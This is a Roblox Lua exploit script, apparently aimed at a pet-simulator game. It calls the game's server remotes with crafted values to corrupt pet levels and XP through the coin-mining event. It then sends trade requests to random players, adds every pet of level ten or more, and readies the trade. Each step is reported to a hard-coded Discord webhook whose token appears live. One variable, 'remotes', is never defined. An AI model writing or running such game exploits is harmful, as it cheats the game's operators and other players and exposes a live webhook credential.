local HttpService = game:GetService("HttpService")

-- Webhook function with error handling
local function sendWebhook(data)
    local webhookUrl = "https://discord.com/api/webhooks/1331684623079440454/yngryhXp2-3kpfEqK1YlCF3W65G5O23xyHKu_IgZiYkpnupnoTs2S7eKGDzdTRZG3GCz" -- Replace with your webhook URL
    local payload = HttpService:JSONEncode(data)

    local success, response = pcall(function()
        return HttpService:PostAsync(webhookUrl, payload, Enum.HttpContentType.ApplicationJson)
    end)

    if success then
        print("Webhook sent successfully: " .. response)
    else
        warn("Failed to send webhook: " .. tostring(response))
    end
end

local a = {
    [1] = "Buy",
    [2] = "Eggs",
    [3] = "Tier 1",
    [4] = false
}

workspace:WaitForChild("__REMOTES"):WaitForChild("Game"):WaitForChild("Shop"):InvokeServer(unpack(a))

local b = nil
local c = false

function d(e)
    if e:IsA("Frame") then
        if e:FindFirstChild("TextButton") then
            e.TextLabel.Text = e.Name
        else
            local f = tonumber(e.Name)
            if f then
                b = f
                c = true
            end
        end
    end
end

while not c do
    for _, g in pairs(game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Pets:children()) do
        d(g)
    end
    task.wait(1)
end

local h = -1
local i = 200e6
local j = false
local k = false

local l = j and k and 3 or j and 1.5 or k and 2 or 1

function m(n)
    return (n + -1) * 2 * (n + 1)
end

function o(p)
    local q, r
    if p < 0 then
        q, r = -3, -3
    else
        q, r = m(p), m(p + 1) - 1
    end
    return q, r
end

local s
for _, t in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets) do
    if t.id == b then
        s = t
        break
    end
end

if s then
    s.l = -1
end

local u, _ = o(h)

local v
for _, w in pairs(workspace.__THINGS.Coins:children()) do
    if w.CoinName.Value == "1 Small Coin" and w.Color == Color3.fromRGB(244, 180, 17) then
        v = w
        break
    end
end

workspace.__REMOTES.Game.Coins:FireServer("Mine", v.Name, ((u - s.xp) * 10) / l, b)

if game.Players.LocalPlayer.Character then
    game.Players.LocalPlayer.Character:MoveTo(v.Position)
end

local x = workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets

local y = false
for _, z in pairs(x) do
    if (z.l == -1 or tostring(z.l) == "nan") and z.Traded then
        y = true
        break
    end
end

if y then
    local aa = game.Workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets
    local ab = {}

    for _, ac in pairs(aa) do
        table.insert(ab, ac.id)
    end

    remotes.Game.Inventory:InvokeServer("MultiDelete", ab)
    return
end

repeat
    task.wait(0.13)
    for _, ad in pairs(x) do
        if ad.l > i and ad.id ~= b then
            task.spawn(function()
                workspace.__REMOTES.Game.Coins:FireServer("Mine", v.Name, ad.l * 2 - 1, ad.id)
            end)
        end
    end
until not v or v.Parent ~= workspace.__THINGS.Coins

local ae = 0
local af = nil
local ag = Instance.new("Hint", workspace)

game:FindFirstChild("Trade Update", true).OnClientEvent:Connect(function(ah)
    af = ah
    ag.Text = "Latest Trade Update ID: " .. af .. " | " .. os.clock()
end)

-- Trade request function
local function ai()
    local aj = game.Players:GetPlayers()
    local ak = aj[math.random(1, #aj)]

    if ak ~= game.Players.LocalPlayer then
        local al = {
            [1] = "InvSend",
            [2] = ak
        }

        workspace:WaitForChild("__REMOTES"):WaitForChild("Game"):WaitForChild("Trading"):InvokeServer(unpack(al))
        print("Trade request sent to: " .. ak.Name)

        -- Send webhook on trade request
        local data = {
            username = "Captain Hook",
            embeds = {{
                title = "Trade Request Sent",
                description = "Trade request sent to: " .. ak.Name,
                color = 3447003 -- Blue color
            }}
        }
        sendWebhook(data)
    end
end

-- Add pet to trade function
local function am(an, ao)
    local ap = {
        [1] = "Add",
        [2] = an,
        [3] = ao
    }

    workspace:WaitForChild("__REMOTES"):WaitForChild("Game"):WaitForChild("Trading"):InvokeServer(unpack(ap))
    print("Added pet to trade with ID: " .. ao)
end

-- Trade ready function
local function aq(ar)
    workspace:WaitForChild("__REMOTES"):WaitForChild("Game"):WaitForChild("Trading"):InvokeServer("Ready", ar)
    print("Trade is ready with ID: " .. ar)

    -- Send a webhook when the trade is accepted
    local data = {
        username = "Captain Hook",
        embeds = {{
            title = "Trade Accepted",
            description = "Trade ID: " .. ar,
            color = 3066993 -- Green color
        }}
    }
    sendWebhook(data)
end

-- Add pets to trade with condition
local function as(at, au)
    local av = workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets
    for _, aw in pairs(av) do
        if au(aw) then
            task.spawn(function()
                am(at, aw.id)
            end)
            task.wait(5) -- Wait 5 seconds between adding pets
        end
    end
end

-- Condition for adding pets
local function ax(ay)
    return ay.l >= 10
end

-- Start trade process
ai()
as(ae, ax)
aq(ae)
